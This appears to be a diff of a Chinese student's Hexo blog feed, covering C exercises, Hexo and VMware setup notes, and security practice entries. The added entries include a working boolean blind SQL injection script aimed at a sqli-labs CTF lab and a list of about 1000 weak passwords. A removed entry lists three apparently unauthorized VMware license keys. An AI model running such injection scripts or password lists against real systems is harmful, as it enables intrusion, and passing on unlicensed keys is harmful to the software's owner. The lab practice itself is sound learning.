+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">srand((unsigned int)time(0));//初始化种子为随机值</span><br><span class="line">int i,n,num;</span><br><span class="line">    printf(&quot;生成几个随机数？我认为是:&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">         for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">             num = rand() % 40 + 41;//产生一个41~80之间的数</span><br><span class="line">             printf(&quot;%d &quot;,num);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> C语言 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>在Hexo博客中添加桌宠（live2D）</title>
-    <url>/2021/09/23/%E5%9C%A8Hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%A1%8C%E5%AE%A0%EF%BC%88live2D%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="1-安装插件"><a href="#1-安装插件" class="headerlink" title="1.安装插件"></a>1.安装插件</h1><p>在博客根目录右键，点击Git Bash Here，输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<p>下载完成能在博客根目录下的 node_moduels 文件夹 中找到 live2d-widget文件夹</p>
-<hr>
-<h1 id="2-下载live2d文件（自己找······）"><a href="#2-下载live2d文件（自己找······）" class="headerlink" title="2.下载live2d文件（自己找······）"></a>2.下载live2d文件（自己找······）</h1><p>下载好之后将所有动画模板拷贝到博客的 node_modules 文件夹里</p>
-<hr>
-<h1 id="3-配置博客根目录下的-config-yml文件（记事本打开就行）"><a href="#3-配置博客根目录下的-config-yml文件（记事本打开就行）" class="headerlink" title="3.配置博客根目录下的_config.yml文件（记事本打开就行）"></a>3.配置博客根目录下的_config.yml文件（记事本打开就行）</h1><p>打开文件，在最后添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-你文件的名字  #模板目录，在node_modules里</span><br><span class="line">  display:</span><br><span class="line">    position: right）</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: false  #是否在手机进行显示（要开启就改为true）</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h1 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h1><p>依次输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-<p>看看本地网站<a href="http://localhost:4000/">http://localhost:4000/</a> 有无显示</p>
-<hr>
-<h1 id="5-部署到github"><a href="#5-部署到github" class="headerlink" title="5.部署到github"></a>5.部署到github</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 随机数 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>简单布尔盲注</title>
+      <link href="/2021/11/21/%E7%AE%80%E5%8D%95%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
+      <url>/2021/11/21/%E7%AE%80%E5%8D%95%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
+      
+        <content type="html"><![CDATA[<p>sqli-libs 第8题</p><p>import requests<br>import time<br>dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>flag=””</p><span id="more"></span><p>#payload: and substr(database(),1,1)=’s’<br>for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://3b6b3138-84d3-47b5-9bc2-a1bc41bc69b4.node4.buuoj.cn/Less-8/?id=1&#39;&quot;">http://3b6b3138-84d3-47b5-9bc2-a1bc41bc69b4.node4.buuoj.cn/Less-8/?id=1&#39;&quot;</a><br>        payload=” and substr(database(),{},1)=’{}’–+”.format(i,char)<br>        url = url + payload<br>        print(url)<br>        r=requests.get(url)<br>        time.sleep(0.00001)<br>        #print(r.text)<br>        if “are” in r.text:<br>            flag+=char<br>            print(flag)<br>print(flag)</p>]]></content>
+      
+      
       <categories>
-        <category>Live2D</category>
+          
+          <category> Web </category>
+          
       </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>安装VMware虚拟机</title>
-    <url>/2021/09/26/%E5%AE%89%E8%A3%85VMware%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
-    <content><![CDATA[<h1 id="1-下载VMware-Workstation-16-Pro-虚拟机软件"><a href="#1-下载VMware-Workstation-16-Pro-虚拟机软件" class="headerlink" title="1.下载VMware Workstation 16 Pro 虚拟机软件"></a>1.下载VMware Workstation 16 Pro 虚拟机软件</h1><p><strong>官网下载：</strong><br><u><a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html">https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html</a></u></p>
-<span id="more"></span>
-<hr>
-<h1 id="2-下载系统文件，例如Linux系统、Windows系统"><a href="#2-下载系统文件，例如Linux系统、Windows系统" class="headerlink" title="2.下载系统文件，例如Linux系统、Windows系统"></a>2.下载系统文件，例如Linux系统、Windows系统</h1><p>Linux有很多版本，这里提供常见的一种: <strong><u><a href="https://cn.ubuntu.com/download/desktop">Ubuntu</a></u></strong> <strong>⬅点击进入</strong><br>Windows也是官网下载</p>
-<hr>
-<h1 id="3-安装刚刚下载的VMware-Workstation-16-Pro"><a href="#3-安装刚刚下载的VMware-Workstation-16-Pro" class="headerlink" title="3.安装刚刚下载的VMware Workstation 16 Pro"></a>3.安装刚刚下载的VMware Workstation 16 Pro</h1><p>打开软件<br>输入许可证以永久使用，网上有，这里给三个：<br>ZF3R0-FHED2-M80TY-8QYGC-NPKYF<br>YF390-0HF8P-M81RQ-2DXQE-M2UT6<br>ZF71R-DMX85-08DQY-8YMNC-PPHV8</p>
-<hr>
-<h1 id="4-创建新的虚拟机"><a href="#4-创建新的虚拟机" class="headerlink" title="4.创建新的虚拟机"></a>4.创建新的虚拟机</h1><h5 id="1-在VMware-Workstation中点击创建新的虚拟机"><a href="#1-在VMware-Workstation中点击创建新的虚拟机" class="headerlink" title="1.在VMware Workstation中点击创建新的虚拟机"></a>1.在VMware Workstation中点击创建新的虚拟机</h5><h5 id="2-选择-安装程序光盘映像文件-iso-M-这个选项，点击浏览，找到刚刚下载的Ubuntu系统文件—-gt-打开，点下一步"><a href="#2-选择-安装程序光盘映像文件-iso-M-这个选项，点击浏览，找到刚刚下载的Ubuntu系统文件—-gt-打开，点下一步" class="headerlink" title="2.选择 安装程序光盘映像文件(iso)(M) 这个选项，点击浏览，找到刚刚下载的Ubuntu系统文件—&gt;打开，点下一步"></a>2.选择 安装程序光盘映像文件(iso)(M) 这个选项，点击浏览，找到刚刚下载的Ubuntu系统文件—&gt;打开，点下一步</h5><h5 id="3-设置个性化Linux，随便"><a href="#3-设置个性化Linux，随便" class="headerlink" title="3.设置个性化Linux，随便"></a>3.设置个性化Linux，随便</h5><h5 id="4-自定义硬件-从本机扣出来给虚拟机用-：内存6g-低于本机内存就行-，处理器数量选1（个人电脑一般只有一颗Cpu），每个处理器内核数量选6（线程数，可以打开任务管理器-gt-性能-gt-cpu-gt-在右边右键-gt-将图形更改为逻辑处理器，查看自己有几个线程）"><a href="#4-自定义硬件-从本机扣出来给虚拟机用-：内存6g-低于本机内存就行-，处理器数量选1（个人电脑一般只有一颗Cpu），每个处理器内核数量选6（线程数，可以打开任务管理器-gt-性能-gt-cpu-gt-在右边右键-gt-将图形更改为逻辑处理器，查看自己有几个线程）" class="headerlink" title="4.自定义硬件(从本机扣出来给虚拟机用)：内存6g(低于本机内存就行)，处理器数量选1（个人电脑一般只有一颗Cpu），每个处理器内核数量选6（线程数，可以打开任务管理器&gt;性能&gt;cpu&gt;在右边右键&gt;将图形更改为逻辑处理器，查看自己有几个线程）"></a>4.自定义硬件(从本机扣出来给虚拟机用)：内存6g(低于本机内存就行)，处理器数量选1（个人电脑一般只有一颗Cpu），每个处理器内核数量选6（线程数，可以打开任务管理器&gt;性能&gt;cpu&gt;在右边右键&gt;将图形更改为逻辑处理器，查看自己有几个线程）</h5><h5 id="5-打开虚拟机，如果蓝屏就是系统冲突，上网搜搜解决办法"><a href="#5-打开虚拟机，如果蓝屏就是系统冲突，上网搜搜解决办法" class="headerlink" title="5.打开虚拟机，如果蓝屏就是系统冲突，上网搜搜解决办法"></a>5.打开虚拟机，如果蓝屏就是系统冲突，上网搜搜解决办法</h5><h5 id="6-改成中文，图文讲解：https-jingyan-baidu-com-article-3aed632ec1d120701180916b-html"><a href="#6-改成中文，图文讲解：https-jingyan-baidu-com-article-3aed632ec1d120701180916b-html" class="headerlink" title="6.改成中文，图文讲解：https://jingyan.baidu.com/article/3aed632ec1d120701180916b.html"></a>6.改成中文，图文讲解：<u><a href="https://jingyan.baidu.com/article/3aed632ec1d120701180916b.html">https://jingyan.baidu.com/article/3aed632ec1d120701180916b.html</a></u></h5>]]></content>
+      
+      
+        <tags>
+            
+            <tag> sql </tag>
+            
+            <tag> 代码 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>1000个弱密码</title>
+      <link href="/2021/11/17/1000%E4%B8%AA%E5%BC%B1%E5%AF%86%E7%A0%81/"/>
+      <url>/2021/11/17/1000%E4%B8%AA%E5%BC%B1%E5%AF%86%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<p>123456<br>123456789<br>111111<br>from91<br>12345678<br>123123<br>5201314<br>000000<br>11111111</p><span id="more"></span><p>a123456<br>163.com<br>fill.com<br>123321<br>123123123<br>00000000<br>1314520<br>7758521<br>1234567<br>666666<br>123456a<br>1234567890<br>woaini<br>a123456789<br>888888<br>88888888<br>147258369<br>qq123456<br>654321<br>zxcvbnm<br>woaini1314<br>112233<br>5211314<br>123456abc<br>520520<br>aaaaaa<br>123654<br>987654321<br>123456789a<br>12345<br>7758258<br>100200<br>147258<br>111222<br>abc123456<br>111222tianya<br>121212<br>1111111<br>abc123<br>110110<br>789456<br>q123456<br>123456aa<br>aa123456<br>asdasd<br>999999<br>123qwe<br>789456123<br>1111111111<br>1314521<br>iloveyou<br>qwerty<br>password<br>qazwsx<br>159357<br>222222<br>woaini520<br>woaini123<br>521521<br>asd123<br>qqqqqq<br>qq1111<br>1234<br>qwe123<br>111111111<br>1qaz2wsx<br>qwertyuiop<br>5201314520<br>asd123456<br>159753<br>31415926<br>qweqwe<br>555555<br>333333<br>woaini521<br>abcd1234<br>ASDFGHJKL<br>123456qq<br>11223344<br>456123<br>123000<br>123698745<br>wangyut2<br>201314<br>zxcvbnm123<br>qazwsxedc<br>1q2w3e4r<br>z123456<br>123abc<br>a123123<br>12345678910<br>asdfgh<br>456789<br>qwe123456<br>321321<br>123654789<br>456852<br>0000000000<br>WOAIWOJIA<br>741852963<br>5845201314<br>aini1314<br>0123456789<br>a321654<br>123456123<br>584520<br>778899<br>520520520<br>7777777<br>q123456789<br>123789<br>zzzzzz<br>qweasdzxc<br>5845211314<br>123456q<br>w123456<br>12301230<br>qq123456789<br>wocaonima<br>qq123123<br>a5201314<br>a12345678<br>asdasdasd<br>a1234567<br>147852<br>110120<br>135792468<br>CAONIMA<br>963852741<br>3.1415926<br>1234560<br>101010<br>7758520<br>753951<br>666888<br>zxc123<br>0000000<br>zhang123<br>987654<br>a111111<br>1233211234567<br>789789<br>25257758<br>7708801314520<br>zzzxxx<br>1111<br>999999999<br>1357924680<br>yahoo.com.cn<br>123456789q<br>12341234<br>5841314520<br>zxc123456<br>yangyang<br>168168<br>123123qaz<br>abcd123456<br>456456<br>963852<br>as123456<br>741852<br>xiaoxiao<br>1230123<br>555666<br>000000000<br>369369<br>211314<br>102030<br>aaa123456<br>zxcvbn<br>110110110<br>buzhidao<br>qaz123<br>123456.<br>asdfasdf<br>123456789.<br>woainima<br>123456ASD<br>woshishui<br>131421<br>123321123<br>dearbook<br>1234qwer<br>qaz123456<br>aaaaaaaa<br>111222333<br>qq5201314<br>3344520<br>147852369<br>1q2w3e<br>windows<br>123456987<br>zz12369<br>qweasd<br>qiulaobai<br>66666666<br>12344321<br>qwer1234<br>a12345<br>7894561230<br>qwqwqw<br>777777<br>110120119<br>951753<br>wmsxie123<br>131420<br>1314520520<br>369258147<br>321321321<br>110119<br>beijing2008<br>321654<br>a000000<br>147896325<br>12121212<br>123456aaa<br>521521521<br>22222222<br>888999<br>123456789ABC<br>abc123456789<br>12345678900<br>1q2w3e4r5t<br>1234554321<br>www123456<br>w123456789<br>336699<br>abcdefg<br>709394<br>258369<br>z123456789<br>314159<br>584521<br>12345678a<br>7788521<br>9876543210<br>258258<br>111111a<br>87654321<br>123asd<br>5201314a<br>134679<br>135246<br>hotmail.com<br>123123a<br>11112222<br>131313<br>100200300<br>11111<br>1234567899<br>520530<br>251314<br>qq66666<br>yahoo.cn<br>123456qwe<br>worinima<br>sohu.com<br>NULL<br>518518<br>123457<br>q1w2e3r4<br>721521<br>123456789QQ<br>584131421<br>qw123456<br>123456..<br>0123456<br>135790<br>3344521<br>980099<br>a1314520<br>123456123456<br>qazwsx123<br>asdf1234<br>444444<br>123456z<br>120120<br>wang123456<br>12345600<br>7758521521<br>12369874<br>abcd123<br>a12369<br>li123456<br>1234567891<br>wang123<br>1234abcd<br>147369<br>zhangwei<br>qqqqqqqq<br>521125<br>010203<br>369258<br>654123<br>woailaopo<br>QAZQAZ<br>121314<br>1qazxsw2<br>zxczxc<br>l123456<br>111000<br>jingjing<br>0000<br>1472583690<br>25251325<br>langzi123<br>wojiushiwo<br>7895123<br>wangjian<br>123qweasd<br>110120130<br>1123581321<br>142536<br>584131420<br>aaa123<br>aaa111<br>woaiwoziji<br>520123<br>665544<br>ab123456<br>a123456a<br>fuckyou<br>99999999<br>5203344<br>qwertyui<br>521314<br>18881888<br>584201314<br>woaini@<br>7654321<br>20082008<br>520131<br>124578<br>852456<br>nihaoma<br>74108520<br>232323<br>55555555<br>zx123456<br>wwwwww<br>119119<br>weiwei<br>13145200<br>LOVE1314<br>564335<br>123456789123<br>wo123456<br>123520<br>52013145201314<br>loveyou<br>wolf8637<br>112358<br>5201314123<br>yuanyuan<br>zhanglei<br>zz123456<br>1234567A<br>a11111<br>000000a<br>321654987<br>xiaolong<br>5841314521<br>shmily<br>520025<br>159951<br>77585210<br>tiantian<br>134679852<br>QWASZX<br>123456654321<br>20080808<br>zhangjian<br>123465<br>9958123<br>159159<br>5508386<br>wangwei<br>5205201314<br>woaini5201314<br>888666<br>52013141314<br>qweqweqwe<br>1122334455<br>123456789z<br>585858<br>33333333<br>aa123123<br>qwertyuiop123<br>q111111<br>9638527410<br>911911<br>qqq111<br>5213344<br>sunshine<br>liu123456<br>abcdef<br>zhendeaini<br>007007<br>555888<br>qq111111<br>jiushiaini<br>mnbvcxz<br>xiaoqiang<br>445566<br>nicholas<br>dongdong<br>123456abcd<br>111qqq<br>aptx4869<br>258456<br>wobuzhidao<br>qazxsw<br>123789456<br>zhang123456<br>7215217758991<br>1234567890123<br>……<br>huang123<br>maomao<br>222333<br>wangyang<br>123456789aa<br>1.23457E+11<br>1234566<br>1230456<br>1a2b3c4d<br>13141314<br>a7758521<br>123456zxc<br>123456as<br>forever<br>s123456<br>12348765<br>xxxxxx<br>asdf123<br>a1b2c3d4<br>246810<br>333666<br>mingming<br>000123<br>jiajia<br>12qwaszx<br>ffffff<br>112233445566<br>77585211314<br>520131400<br>aa123456789<br>wpc000821<br>WANGJING<br>woaini1314520<br>&amp;nbsp<br>000111<br>qq1314520<br>1234512345<br>147147<br>123456qaz<br>q123123<br>123456ab<br>xiaofeng<br>wodemima<br>shanshan<br>w2w2w2<br>666999<br>123456w<br>321456<br>feifei<br>dragon<br>computer<br>dddddd<br>zhangjie<br>baobao<br>x123456<br>q1w2e3<br>chenchen<br>12345679<br>131452<br>caonima123<br>asdf123456<br>tangkai<br>52013140<br>longlong<br>ssssss<br>www123<br>1234568<br>q1q1q1q1<br>asdfghjkl123<br>14789632<br>123456711<br>michael<br>tingting<br>woshishei<br>asd123456789<br>1314258<br>sunliu66<br>qwert12345<br>235689<br>565656<br>1234569<br>ww123456<br>1314159<br>5211314521<br>123456789w<br>123123aa<br><a href="mailto:&#x31;&#x33;&#57;&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;">&#x31;&#x33;&#57;&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#54;&#51;&#46;&#99;&#111;&#109;</a><br>111111q<br>hao123456<br>52tiance<br>19830122<br>y123456<br>110119120<br>1231230<br>sj811212<br>13579246810<br>123.123<br>superman<br>789123<br>12345qwert<br>770880<br>js77777<br>zhangyang<br>686868<br>@163.com<br>imzzhan<br>xiaoyu<br>7758521a<br>abc12345<br>nihao123<br>wokaonima<br>q11111<br>623623623<br>989898<br>122333<br>13800138000<br>laopowoaini<br>787878<br>123456l<br>a123123123<br>198611<br>332211<br>tom.com<br>212121<br>woaini123456<br>wanglei<br>yang123456<br>zhangqiang<br>zxcvbnm,./<br>zhangyan<br>181818<br>234567<br>stryker<br>167669123<br>laopo520<br>2597758<br>aa5201314<br>139.com<br>5201314.<br>8888888888<br>74107410<br>zhanghao<br>77777777<br>zhangyu<br>zzb19860526<br>qwertyu<br>5201314qq<br>198612<br>q5201314<br>999888<br>369852<br>121121<br>1122334<br>123456789asd<br>123zxc<br>a123321<br>QWErtyUIO<br>456456456<br>qq000000<br>m123456<br>q1w2e3r4t5<br>woainilaopo<br>123456789*<br>131425<br>liuchang<br>85208520<br>zhangjing<br>c123456<br>asdfghjk<br>qq1234<br>asdzxc<br>hao123<br>777888<br>131131<br>woainia<br>beyond<br>zhang520<br>556688<br>123456qw<br>wangchao<br>woshiniba<br>168888<br>7758991<br>woshizhu<br>ainiyiwannian<br>LAOpo521<br>abcd123456789<br>qwerasdf<br>123456ok<br>woshinidie<br>huanhuan<br>1hxboqg2s<br>meiyoumima<br>456321<br>QQQ123456<br>1314<br>898989<br>123456798<br><a href="mailto:&#x70;&#x70;&#x2e;&#99;&#111;&#x6d;&#64;&#49;&#54;&#51;&#46;&#99;&#111;&#109;">&#x70;&#x70;&#x2e;&#99;&#111;&#x6d;&#64;&#49;&#54;&#51;&#46;&#99;&#111;&#109;</a><br>mm123456<br>123698741<br>a520520<br>z321321<br>asasas<br>YANG123<br>584211314<br>1234561<br>123456789+<br>miaomiao<br>789789789<br>7788520<br>AAAAAAa<br>h123456<br>3838438<br>l123456789<br>198511<br>ABCDEFG123<br>zhangjun<br>123qaz<br>198512<br>2525775<br>54545454<br>789632145<br>831213<br>10101010<br>xiaohe<br>19861010<br>10203<br>woshishen<br>0987654321<br>yj2009<br>wangqiang<br>198411<br>1314520a<br>xiaowei<br>123456000<br>123987<br>love520<br>caonimabi<br>qwe123123<br>010101<br>qq666666<br>789987<br>10161215<br>liangliang<br>qwert123<br>112112<br>qianqian<br>1a2b3c<br>198410<br>nuttertools<br>goodluck<br>zhangxin<br>18n28n24a5<br>liuyang<br>998877<br>woxiangni<br>7788250<br>a147258369<br>zhangliang<br>16897168<br>223344<br>123123456<br>a1b2c3<br>killer<br>321123<br>pp.com<br>chen123456<br>wangpeng<br>753159<br>775852100<br>1478963<br>1213141516<br>369369369<br>1236987<br>123369<br>12345a<br>bugaosuni<br>13145201314520<br>110112<br>123456…<br>JIAOJIAO<br>100100<br>1314520123<br>19841010<br>7758521123<br>shangxin<br>woshiwo<br>12312300<br>xingxing<br>yingying<br>1233210<br>34416912<br>qq12345<br>qweasd123<br>nishizhu<br>19861020<br>qwe123456789<br>808080<br>1310613106<br>456789123<br>44444444<br>123123qq<br>3141592653<br>556677<br>xx123456<br>jianjian<br>a1111111<br>0.123456<br>198610<br>loveme<br>tianshi<br>woxihuanni<br>11235813<br>252525<br>225588<br>lovelove<br>mengmeng<br>7758258520<br>xiaoming<br>shanghai<br>huyiming<br>6543210<br>a7758258<br>7788414<br>123456789..<br>Jordan<br>nishiwode<br>ZHUZHU<br>1314woaini<br>chenjian<br>131415<br>xy123456<br>123456520<br>a00000<br>jiang123<br>WOAIMAMA<br>monkey<br>7418529630<br>lingling<br>987456321<br>w5201314<br>qwer123456<br>198412<br>asdasd123<br>zzzzzzzz<br>1q1q1q<br>741741<br>987456<br>19851010<br>2587758<br>456654<br>Iloveyou1314<br>q12345<br>imissyou<br>daniel<br>aipai<br>2222222<br>0147258369<br>123456789l<br>q1234567<br>963963<br>123123123123<br>125521<br>womendeai<br>baobei520<br>19861015<br>667788<br>000000.<br>zhangtao<br>yy123456<br>chen123<br>nishishui<br>789654<br>liu123<br>19861212<br>1230<br>19841020<br>wangjun<br>wangliang<br>zhangpeng<br>woainimama<br>zhangchao<br>5201314q<br>19841025<br>123567<br>aaaa1111<br>123456+<br>134679258<br>668899<br>811009<br>qaz123456789<br>123456789qwe<br>111112<br>130130<br>19861016<br>wozhiaini<br>198712<br>123…<br>abcde12345<br>abcd12345<br>wanggang<br>llllll<br>5121314<br>456258<br>125125<br>qq7758521<br>369963<br>987987<br>142857<br>poiuytrewq<br>qqq123<br>323232<br>baobei<br>g227w212<br>962464<br>mylove<br>p1a6s3m<br>202020<br>19491001<br>963258<br>hhhhhh<br>2582587758<br>wangfeng<br>tiancai<br>11111111111<br>summer<br>wangwang<br>asd123123<br>19841024<br>xinxin<br>0.0.0.<br>19861012<br>19861210<br>8888888<br>zhanghui<br>wenwen<br>635241<br>ASDFGHJ<br>19861023<br>1234567890.<br>888168<br>19861120<br>tianya<br>123aaa<br>111aaa<br>123456789aaa<br>8008208820<br>123123q<br>football<br>dandan<br>www123456789<br>19861026<br>qingqing<br>315315<br>1111122222<br>171204jg<br>19861021<br>5555555<br>AS123456789<br>qqqwww<br>19861024<br>yahoo.com<br>19861225<br>1qaz1qaz<br>19871010<br>1029384756<br>123258<br>zxcv123<br>19861123<br>1314520.<br>aidejiushini<br>123qwe123<br>198711<br>operation<br>19861025<br>yu123456<br>19851225<br>wangshuai<br>19841015<br>520521<br>wangyan<br>19861011<br>7007<br>123456zz<br>521000<br>198311<br>299792458<br>112211</p><hr><p>00000<br>qwer123<br>51201314<br>qazwsxedcrfv<br>LOVE5201314<br>198312<br>198510<br>888888888<br>1314521521<br>internet<br>z123123<br>a147258<br>696969<br>1234321<br>476730751<br>5201314789<br>012345<br>19861022<br>welcome<br>aqwe518951<br>19861121<br>HUANGwei<br>868686<br>wanghao<br>NIAIWOMA<br>xiaojian<br>19851120<br>19851212<br>100000<br>19841022<br>zhangbin<br>shadow<br>mmmmmm<br>000…<br>1357913579<br>77585217758521<br>19861216<br>19841016<br>az123456<br>zxcv1234<br>19841023<br>wu123456<br>163163<br>2008520085<br>pppppp<br>789654123<br>EtnXtxSa65<br>19851025<br>woaiwolaopo<br>ww111111<br>woaini110<br>123455<br>19841026<br>19881010<br>www163com<br>159357456<br>fangfang<br>19851015<br>19861013<br>19861220<br>12312<br>19861018<br>19861028<br>a11111111<br>19841018<br>119911<br>AI123456<br>198211<br>55555<br>zhangkai<br>wangxin<br>xihuanni<br>19871024<br>19861218<br>16899168<br>1010110<br>nimabi<br>19861125<br>52013143344<br>131452000<br>19871020<br>freedom<br>baobao520<br>winner<br>123456m<br>12312312</p>]]></content>
+      
+      
       <categories>
-        <category>虚拟机</category>
+          
+          <category> 密码 </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>安装虚拟机后本机WIFI无法使用</title>
-    <url>/2021/10/14/%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%8E%E6%9C%AC%E6%9C%BAWIFI%E4%B8%A2%E5%A4%B1/</url>
-    <content><![CDATA[<p>推优会回来，打开电脑，WIFI消失了，十分难过。</p>
-<p>右键此电脑，点击管理-&gt;设备管理器-&gt;网络适配器<br>怒斥网卡：“李在干什么？”</p>
-<span id="more"></span>
-<p><img src="https://s3.bmp.ovh/imgs/2021/10/1192c186784718a9.png"><br>网卡回答：“代码56”</p>
-<p>搜索一番便找到了解决方法，下载 Ccleaner 👉<strong><a href="https://www.ccleaner.com/download">https://www.ccleaner.com/download</a></strong><br>用它恢复注册表，重启电脑，就行了······<br>指导你使用👉 <strong><a href="https://www.pianshen.com/article/7279702665/">https://www.pianshen.com/article/7279702665/</a></strong></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>整数字符串整数，整数</title>
+      <link href="/2021/11/14/%E6%95%B4%E6%95%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B4%E6%95%B0%EF%BC%8C%E6%95%B4%E6%95%B0/"/>
+      <url>/2021/11/14/%E6%95%B4%E6%95%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B4%E6%95%B0%EF%BC%8C%E6%95%B4%E6%95%B0/</url>
+      
+        <content type="html"><![CDATA[<p>字符串长度固定为5，将三个整数相加，如123abcde456，789，输出为1368。</p><p>简单版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a,b,c;</span><br><span class="line">scanf(&quot;%d*5c%d,%d&quot;,&amp;a,&amp;b,&amp;c);</span><br><span class="line">printf(&quot;%d&quot;,a+b+c);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复杂版：</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char a[1000],b[1000],c[1000],x;</span><br><span class="line">int n,o,p,q,z,i=0,j=0,k=0,d[1000],e[1000],f[1000],flag1=1,flag2=1,flag3=1;</span><br><span class="line"></span><br><span class="line">while((x=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line"> if(x&gt;=&#x27;0&#x27; &amp;&amp; x&lt;=&#x27;9&#x27;)</span><br><span class="line">     a[i]=x,</span><br><span class="line">     i++;</span><br><span class="line"> else if(x==&#x27;-&#x27;)</span><br><span class="line">     flag1=-1;</span><br><span class="line"> else break;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    x=getchar();</span><br><span class="line">    x=getchar();</span><br><span class="line">    x=getchar();</span><br><span class="line">    x=getchar();</span><br><span class="line">    </span><br><span class="line">while((x=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">     if(x&gt;=&#x27;0&#x27; &amp;&amp; x&lt;=&#x27;9&#x27;)</span><br><span class="line">     b[j]=x,</span><br><span class="line">     j++;</span><br><span class="line"> else if(x==&#x27;-&#x27;)</span><br><span class="line">     flag2=-1;</span><br><span class="line"> else break; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">while((x=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">     if(x&gt;=&#x27;0&#x27; &amp;&amp; x&lt;=&#x27;9&#x27;)</span><br><span class="line">     c[k]=x,</span><br><span class="line">     k++;</span><br><span class="line"> else if(x==&#x27;-&#x27;)</span><br><span class="line">     flag3=-1;</span><br><span class="line"> else 